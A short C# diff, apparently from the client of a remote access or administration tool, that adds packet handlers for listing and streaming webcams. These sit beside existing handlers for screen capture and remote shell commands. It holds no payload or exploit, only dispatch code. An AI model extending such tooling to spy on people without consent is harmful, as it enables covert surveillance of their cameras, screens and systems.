@@ -13,13 +13,25 @@ namespace Client.Packets
             {
                 RemoteDesktopController.getMonitors(client);
             }
-            else if(type == TypePackets.GetDesktop)
+            else if (type == TypePackets.GetDesktop)
             {
                 RemoteDesktopController.getDesktop(client);
             }
             else if (type == TypePackets.GetExecuteShellCmd)
             {
                 RemoteShellController.getExecuteShellCmd((GetExecuteShellCmd)packet, client);
+            }
+            else if (type == TypePackets.GetAvailableWebcams)
+            {
+                RemoteWebcamController.getAvailableWebcams((GetAvailableWebcams)packet, client);
+            }
+            else if (type == TypePackets.GetWebcam)
+            {
+                RemoteWebcamController.getWebcam((GetWebcam)packet, client);
+            }
+            else if (type == TypePackets.StopWebcam)
+            {
+                RemoteWebcamController.stopWebcam();
             }
         }
     }
